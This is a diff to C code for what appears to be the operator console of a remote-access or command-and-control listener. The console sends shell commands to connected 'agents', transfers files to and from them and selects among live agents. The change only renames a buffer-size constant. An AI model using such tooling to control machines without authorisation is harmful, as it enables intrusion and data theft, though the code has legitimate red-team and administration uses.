@@ -40,7 +40,7 @@ extern volatile sig_atomic_t shell_flag;
 
 STATIC int shell_console(int agent_fd){
 	int retval;
-	char command_buf[FIRST_PAYLOAD_SIZE];
+	char command_buf[PAYLOAD_SIZE];
 	char* buffer;
     fd_set console_fds;
     struct timeval tv;
@@ -63,18 +63,18 @@ STATIC int shell_console(int agent_fd){
 			return RET_ERROR;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
-			memset(command_buf, 0, FIRST_PAYLOAD_SIZE);
-			if (!fgets(command_buf, FIRST_PAYLOAD_SIZE, stdin)){
+			memset(command_buf, 0, PAYLOAD_SIZE);
+			if (!fgets(command_buf, PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
 				return RET_ERROR;
 			}
 
-			buffer = malloc(FIRST_PAYLOAD_SIZE);
-			memset(buffer, 0, FIRST_PAYLOAD_SIZE);
-			memcpy(buffer, command_buf, FIRST_PAYLOAD_SIZE);
+			buffer = malloc(PAYLOAD_SIZE);
+			memset(buffer, 0, PAYLOAD_SIZE);
+			memcpy(buffer, command_buf, PAYLOAD_SIZE);
 
-			listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strnlen(buffer, FIRST_PAYLOAD_SIZE));
+			listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strnlen(buffer, PAYLOAD_SIZE));
 			print_out("%s\n", "");
 		}
 	}
@@ -85,12 +85,12 @@ STATIC int shell_console(int agent_fd){
 }
 
 STATIC int get_file_command(int agent_fd){
-	char buf[FIRST_PAYLOAD_SIZE];
+	char buf[PAYLOAD_SIZE];
 	int file_name_size;
 	char* file_name_buffer;
 
 	print_out("%s\n", "File name");
-	if (!fgets(buf, FIRST_PAYLOAD_SIZE, stdin)){
+	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
 		return RET_ERROR;
 	}
@@ -107,13 +107,13 @@ STATIC int get_file_command(int agent_fd){
 }
 
 STATIC int put_file_command(int agent_fd){
-	char buf[FIRST_PAYLOAD_SIZE];
+	char buf[PAYLOAD_SIZE];
 	FILE* file_fd;
 	int file_size, file_name_size, bytes_read;
 	char *file_buffer, *file_name_buffer;
 
 	print_out("%s\n", "Source file");
-	if (!fgets(buf, FIRST_PAYLOAD_SIZE, stdin)){
+	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("ERROR fgets\n");
 		return RET_ERROR;
 	}
@@ -153,7 +153,7 @@ STATIC int put_file_command(int agent_fd){
 	fclose(file_fd);
 
 	print_out("%s\n", "Destination file (default is current directory)");
-	if (!fgets(buf, FIRST_PAYLOAD_SIZE, stdin)){
+	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
 		printf("fgets error\n");
 		return RET_ERROR;
 	}
@@ -175,7 +175,7 @@ STATIC int put_file_command(int agent_fd){
 
 STATIC int agent_console(int agent_fd){
 	int retval;
-	char opt_buf[FIRST_PAYLOAD_SIZE];
+	char opt_buf[PAYLOAD_SIZE];
 	long option;
     fd_set console_fds;
     struct timeval tv;
@@ -195,7 +195,7 @@ STATIC int agent_console(int agent_fd){
 			return RET_ERROR;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
-			if (!fgets(opt_buf, FIRST_PAYLOAD_SIZE, stdin)){
+			if (!fgets(opt_buf, PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
 				return RET_ERROR;
@@ -241,7 +241,7 @@ void *console_thread(void *vargp){
 							"/\\__/ / |_| /\\__/ / |_| |  _| |_| |  | || |   | |____| | | || |\\  | | |  \n"
 							"\\____/ \\___/\\____/ \\___/   \\___/\\_|  |_/\\_|   \\_____/\\_| |_/\\_| \\_/ \\_/  \n";
 	int retval;
-	char buffer[FIRST_PAYLOAD_SIZE];
+	char buffer[PAYLOAD_SIZE];
 	long option;
     fd_set console_fds;
     struct timeval tv;
@@ -264,7 +264,7 @@ void *console_thread(void *vargp){
 			break;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
-			if (!fgets(buffer, FIRST_PAYLOAD_SIZE, stdin)){
+			if (!fgets(buffer, PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
 				break;
@@ -286,7 +286,7 @@ void *console_thread(void *vargp){
 					break;
 				case 2:
 					printf("Which agent?\n");
-					fgets(buffer, FIRST_PAYLOAD_SIZE, stdin);
+					fgets(buffer, PAYLOAD_SIZE, stdin);
 					option = strtol(buffer, NULL, 10);
 					if (CA->agents[option].alive){
 						agent_console(option);
